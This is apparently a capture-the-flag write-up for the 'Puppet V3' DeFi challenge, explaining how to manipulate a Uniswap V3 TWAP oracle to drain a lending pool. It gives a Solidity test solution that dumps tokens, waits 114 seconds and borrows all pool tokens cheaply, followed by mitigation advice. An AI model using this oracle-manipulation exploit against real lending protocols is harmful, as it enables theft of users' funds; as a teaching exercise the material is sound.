# Puppet V3 - Solution

## Challenge Overview

A lending pool has upgraded to use Uniswap V3's Time-Weighted Average Price (TWAP) oracle instead of spot prices. The pool:
- Uses a **10-minute TWAP period** for price calculations
- Requires **3x collateral** in WETH to borrow DVT tokens
- Contains **1,000,000 DVT** tokens available for borrowing

**Initial conditions:**
- Uniswap V3 Pool: 100 WETH + 100 DVT liquidity
- Player: 110 DVT + 1 ETH
- **Constraint: Must complete within 114 seconds**

## The Vulnerability

While TWAP is more resistant to manipulation than spot prices, it's still vulnerable under certain conditions:

### TWAP Calculation
The TWAP formula is:
```
TWAP = (tickCumulative[now] - tickCumulative[now - period]) / period
```

### Why TWAP Can Still Be Manipulated

1. **Tick Observations**: Uniswap V3 records tick observations at discrete intervals
2. **Cumulative Effect**: After a large swap, new observations at the crashed price start accumulating
3. **Partial Update**: Even within 114 seconds, the TWAP begins shifting toward the manipulated price
4. **Small Window Exploitation**: With a large enough swap (110 DVT vs 100 in pool), the price impact is severe enough that even partial TWAP movement makes the attack profitable

### The Math

- **Before manipulation**: 1 DVT ≈ 1 WETH (1:1 ratio in pool)
- **After swap**: The spot price crashes dramatically (110 DVT dumped into 100:100 pool)
- **TWAP shift**: Even with only ~2 minutes of accumulated observations at the new price, the TWAP drops significantly
- **Collateral calculation**: At manipulated TWAP, 1M DVT requires much less than 1M WETH collateral

## Exploit Strategy

```
1. Swap all 110 DVT → WETH (crashes spot price on Uniswap V3)
2. Wrap remaining ETH to WETH (maximize collateral)
3. Wait 114 seconds (allow TWAP to partially update)
4. Calculate required WETH deposit at manipulated price
5. Borrow all 1,000,000 DVT tokens
6. Transfer tokens to recovery account
```

## Solution Code

```solidity
function test_puppetV3() public checkSolvedByPlayer {
    // Step 1: Swap all DVT for WETH (crashes the spot price)
    token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
    router.exactInputSingle(
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: player,
            deadline: block.timestamp,
            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        })
    );

    // Step 2: Wrap remaining ETH to WETH
    weth.deposit{value: player.balance}();

    // Step 3: Wait for TWAP to partially update (within 114 second limit)
    skip(114);

    // Step 4: Calculate deposit needed and borrow all tokens
    uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    
    // Approve and borrow
    weth.approve(address(lendingPool), depositRequired);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

    // Step 5: Transfer all tokens to recovery
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## Key Differences from Puppet V1/V2

| Feature | V1/V2 | V3 |
|---------|-------|-----|
| Price Source | Spot price | TWAP (10 min) |
| Manipulation Resistance | None | Partial |
| Required Approach | Instant swap | Swap + wait |
| Time Required | 1 block | Up to 114 seconds |

## Mitigation Recommendations

1. **Longer TWAP periods**: Use 30+ minute TWAP windows
2. **Multiple oracles**: Cross-reference with Chainlink or other external oracles
3. **Liquidity checks**: Verify pool has sufficient liquidity depth
4. **Manipulation detection**: Monitor for sudden large swaps before borrowing
5. **Rate limiting**: Add cooldown periods between large borrow operations
6. **Price deviation checks**: Reject transactions if TWAP deviates significantly from recent averages

